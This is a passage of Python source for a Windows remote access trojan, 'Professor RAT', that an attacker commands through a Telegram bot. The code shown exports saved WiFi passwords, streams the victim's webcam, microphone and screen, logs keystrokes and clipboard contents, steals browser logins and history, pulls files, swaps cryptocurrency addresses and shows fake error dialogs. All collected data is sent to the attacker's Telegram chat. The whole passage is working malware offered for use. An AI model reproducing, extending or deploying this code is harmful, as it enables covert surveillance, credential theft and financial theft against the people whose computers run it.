                message_parts.append(f"┌ <b>Network {i}</b>")
                message_parts.append(f"├ 📡 SSID: {wifi['ssid']}")
                message_parts.append(f"└ 🔑 Password: <code>{wifi['password']}</code>")
                message_parts.append("")
            
            message_text = "\n".join(message_parts)
            if len(message_text) > 4000:
                chunks = [message_text[i:i+4000] for i in range(0, len(message_text), 4000)]
                for chunk in chunks:
                    send_message(chunk)
                    time.sleep(1)
            else:
                send_message(message_text)
                
            return f"📶 <b>WiFi passwords exported</b>\n\n✅ Found {len(wifi_data)} networks"
        else:
            return "❌ <b>No WiFi profiles found</b>\n\n⚠️ No saved WiFi networks detected"
            
    except Exception as e:
        return f"❌ <b>WiFi export failed</b>\n\n⚠️ Error: {str(e)}"

def get_system_info():
    user = os.getenv('USERNAME')
    computer = os.getenv('COMPUTERNAME')
    boot_time = psutil.boot_time()
    uptime = time.time() - boot_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except:
        local_ip = "Unknown"
    
    return f"👤 <b>User:</b> {user}\n💻 <b>Computer:</b> {computer}\n🌐 <b>Local IP:</b> {local_ip}\n⏱️ <b>Uptime:</b> {hours}h {minutes}m\n🟢 <b>Status:</b> Active"

def force_shutdown():
    os.system("shutdown /s /t 5 /f")
    return "🛑 <b>System shutdown initiated</b>\n\n⚠️ Computer will force shutdown in 5 seconds!"

def force_restart():
    os.system("shutdown /r /t 5 /f")
    return "🔄 <b>System restart initiated</b>\n\n⚠️ Computer will restart in 5 seconds!"

def show_message(text):
    ctypes.windll.user32.MessageBoxW(0, text, "Windows Security", 0x1000)
    return f"💬 <b>Message displayed to user</b>\n\n✅ User saw: <code>{text}</code>"

def show_fake_error():
    try:
        ctypes.windll.user32.MessageBoxW(0, 
            "The program can't start because api-ms-win-crt-runtime-l1-1-0.dll is missing from your computer. Try reinstalling the program to fix this problem.", 
            "System Error", 
            0x1000)
        return "💀 <b>Fake error displayed</b>\n\n✅ User saw a fake system error message"
    except Exception as e:
        return f"❌ <b>Fake error failed</b>\n\n⚠️ Error: {str(e)}"

# ==================== LIVE STREAMING FUNCTIONS ====================
def live_camera_stream():
    global camera_stream_active
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            send_message("❌ <b>Live camera failed</b>\n\n⚠️ Could not access webcam")
            return
            
        send_message("📹 <b>Live camera started</b>\n\n🔴 Streaming webcam feed...\n⏹️ Send /stop to end stream")
        
        camera_stream_active = True
        frame_count = 0
        
        while camera_stream_active and frame_count < 300:
            ret, frame = cap.read()
            if not ret:
                break
                
            if frame_count % 15 == 0:
                temp_path = os.path.join(HIDDEN_FOLDER, f'live_cam_{frame_count}.jpg')
                cv2.imwrite(temp_path, frame)
                send_photo(temp_path)
                safe_delete_file(temp_path)
                
            frame_count += 1
            time.sleep(0.2)
            
        cap.release()
        camera_stream_active = False
        send_message("📹 <b>Live camera stopped</b>\n\n✅ Camera stream ended")
        
    except Exception as e:
        camera_stream_active = False
        send_message(f"❌ <b>Live camera failed</b>\n\n⚠️ Error: {str(e)}")

def live_microphone_stream():
    global microphone_stream_active
    try:
        send_message("🎤 <b>Live microphone started</b>\n\n🔴 Streaming audio...\n⏹️ Send /stop to end stream")
        
        microphone_stream_active = True
        chunk_count = 0
        
        while microphone_stream_active and chunk_count < 60:
            sample_rate = 44100
            chunk_duration = 3
            temp_path = os.path.join(HIDDEN_FOLDER, f'live_mic_{chunk_count}.wav')
            
            recording = sd.rec(int(chunk_duration * sample_rate), 
                              samplerate=sample_rate, 
                              channels=1, 
                              dtype='int16')
            sd.wait()
            
            with wave.open(temp_path, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(2)
                wf.setframerate(sample_rate)
                wf.writeframes(recording.tobytes())
            
            send_audio(temp_path)
            safe_delete_file(temp_path)
            
            chunk_count += 1
            
        microphone_stream_active = False
        send_message("🎤 <b>Live microphone stopped</b>\n\n✅ Microphone stream ended")
        
    except Exception as e:
        microphone_stream_active = False
        send_message(f"❌ <b>Live microphone failed</b>\n\n⚠️ Error: {str(e)}")

def stop_all_streams():
    global live_stream_active, camera_stream_active, microphone_stream_active, keylogger_active
    live_stream_active = False
    camera_stream_active = False
    microphone_stream_active = False
    if keylogger_active:
        stop_keylogger()
    return "⏹️ <b>All streams stopped</b>\n\n✅ Screen, camera, microphone streams and keylogger terminated"

# ==================== COMMAND HANDLER ====================
def handle_commands():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            data = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.post(url, data=data, timeout=35).json()
            
            if "result" in response:
                for update in response["result"]:
                    last_update_id = update["update_id"]
                    message = update.get("message", {})
                    text = message.get("text", "")
                    chat_id = message.get("chat", {}).get("id")
                    
                    if str(chat_id) == CHAT_ID:
                        if text == "/clipboard":
                            if clipboard_history:
                                message_parts = []
                                message_parts.append("📋 <b>Clipboard history</b>")
                                message_parts.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                                message_parts.append(f"📊 Total entries: {len(clipboard_history)}")
                                message_parts.append("")
                                
                                for i, entry in enumerate(clipboard_history[-10:], 1):
                                    message_parts.append(f"{i}. {entry}")
                                
                                message_text = "\n".join(message_parts)
                                send_message(message_text)
                            else:
                                send_message("📋 <b>Clipboard history</b>\n\n❌ No clipboard data recorded yet")
                        
                        elif text == "/screenshot":
                            result = take_screenshot()
                            send_message(result)
                        
                        elif text == "/picture":
                            result = take_picture()
                            send_message(result)
                        
                        elif text.startswith("/audio"):
                            try:
                                parts = text.split()
                                if len(parts) > 1:
                                    seconds = int(parts[1])
                                    if seconds > 300:
                                        seconds = 300
                                else:
                                    seconds = 10
                                result = record_microphone(seconds)
                                send_message(result)
                            except:
                                result = record_microphone(10)
                                send_message(result)
                        
                        elif text.startswith("/record"):
                            try:
                                parts = text.split()
                                if len(parts) > 1:
                                    seconds = int(parts[1])
                                    if seconds > 300:
                                        seconds = 300
                                else:
                                    seconds = 10
                                result = record_screen(seconds)
                                send_message(result)
                            except:
                                result = record_screen(10)
                                send_message(result)
                        
                        elif text == "/live screen":
                            if not live_stream_active:
                                threading.Thread(target=live_screen_stream, daemon=True).start()
                                send_message("🖥️ <b>Live screen stream starting</b>\n\n🔴 Initializing desktop stream...\n⏰ Updates every 3 seconds\n⏹️ Send /stop to end stream")
                            else:
                                send_message("🖥️ <b>Live screen already active</b>\n\n⏹️ Send /stop to end stream")
                        
                        elif text == "/live camera":
                            if not camera_stream_active:
                                threading.Thread(target=live_camera_stream, daemon=True).start()
                            else:
                                send_message("📹 <b>Live camera already active</b>\n\n⏹️ Send /stop to end stream")
                        
                        elif text == "/live mic":
                            if not microphone_stream_active:
                                threading.Thread(target=live_microphone_stream, daemon=True).start()
                            else:
                                send_message("🎤 <b>Live microphone already active</b>\n\n⏹️ Send /stop to end stream")
                        
                        elif text == "/stop":
                            result = stop_all_streams()
                            send_message(result)
                        
                        elif text == "/wifi":
                            result = export_wifi_passwords()
                            send_message(result)
                        
                        elif text == "/system":
                            result = get_system_info()
                            send_message(result)
                        
                        elif text == "/processes":
                            result = get_running_processes()
                            send_message(result)
                        
                        elif text.startswith("/kill "):
                            pid = text.split()[1]
                            result = kill_process(pid)
                            send_message(result)
                        
                        elif text == "/crypto":
                            result = show_crypto_addresses()
                            send_message(result)
                        
                        elif text.startswith("/swap "):
                            parts = text.split()
                            if len(parts) >= 3:
                                crypto = parts[1]
                                address = ' '.join(parts[2:])
                                result = set_crypto_address(crypto, address)
                                send_message(result)
                            else:
                                send_message("❌ <b>Invalid format</b>\n\n💡 <b>Usage:</b> /swap [crypto] [address]\n\n💰 <b>Example:</b> <code>/swap BTC 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</code>")
                        
                        elif text == "/shutdown":
                            result = force_shutdown()
                            send_message(result)
                        
                        elif text == "/restart":
                            result = force_restart()
                            send_message(result)
                        
                        elif text.startswith("/msg "):
                            message_text = text[5:]
                            result = show_message(message_text)
                            send_message(result)
                        
                        elif text == "/error":
                            result = show_fake_error()
                            send_message(result)
                        
                        elif text == "/location":
                            result = get_location()
                            send_message(result)
                        
                        elif text.startswith("/files"):
                            path = ' '.join(text.split()[1:]) if len(text.split()) > 1 else None
                            result = list_directory(path)
                            send_message(result)

                        elif text == "/downloads":
                            result = get_browser_downloads()
                            send_message(result)
                        
                        elif text.startswith("/download"):
                            path = ' '.join(text.split()[1:]) if len(text.split()) > 1 else None
                            if not path:
                                send_message("❌ <b>No path specified</b>\n\n💡 <b>Usage:</b> /download [full_file_path]")
                            else:
                                result = download_file(path)
                                send_message(result)
                        
                        elif text == "/keylogger on":
                            result = start_keylogger()
                            send_message(result)
                        
                        elif text == "/keylogger off":
                            result = stop_keylogger()
                            send_message(result)

                        elif text == "/steal":
                            result = steal_login_info()
                            send_message(result)

                        elif text == "/history":
                            result = get_browser_history()
                            send_message(result)

                        
                        elif text == "/help":
                            help_text = """
🤖 <b>Professor RAT</b> 🤖

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 <b>Media & Monitoring</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<code>/screenshot</code> - Take screenshot
<code>/picture</code> - Take webcam photo
<code>/audio [seconds]</code> - Record microphone
<code>/record [seconds]</code> - Record screen
<code>/live screen</code> - Live desktop stream
<code>/live camera</code> - Live webcam stream
<code>/live mic</code> - Live microphone stream
<code>/stop</code> - Stop all active streams

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 <b>Data Extraction</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<code>/steal</code> - Extract weak browser login data
<code>/history</code> - Get browser history
<code>/downloads</code> - Get download history
<code>/files [path]</code> - Browse file system
<code>/download [path]</code> - Download remote file
<code>/clipboard</code> - Show clipboard history

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 <b>System Control L</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<code>/system</code> - Get system information
<code>/location</code> - Get approximate geolocation
<code>/processes</code> - List running processes
<code>/kill [pid]</code> - Terminate process
<code>/wifi</code> - Export saved WiFi passwords
<code>/shutdown</code> - Force system shutdown
<code>/restart</code> - Force restart computer
<code>/msg [text]</code> - Show message to user
<code>/error</code> - Show fake error message

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 <b>Crypto Tools</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<code>/crypto</code> - Show crypto addresses
<code>/swap [crypto] [address]</code> - Set swap address

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ <b>Keylogger</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<code>/keylogger on</code> - Start keystroke monitoring
<code>/keylogger off</code> - Stop keylogger

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                            """
                            send_message(help_text)
                        
                        elif text.startswith("/"):
                            send_message("❌ <b>Unknown command</b>\n\n💡 Type /help to see available commands")
            
        except Exception as e:
            time.sleep(5)

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    try:
        send_message("🟢 <b>System Online</b>\n\n💻 Agent is now active and monitoring\n📡 Ready to receive commands")
        
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()
        
        handle_commands()
        
    except Exception as e:
        time.sleep(30)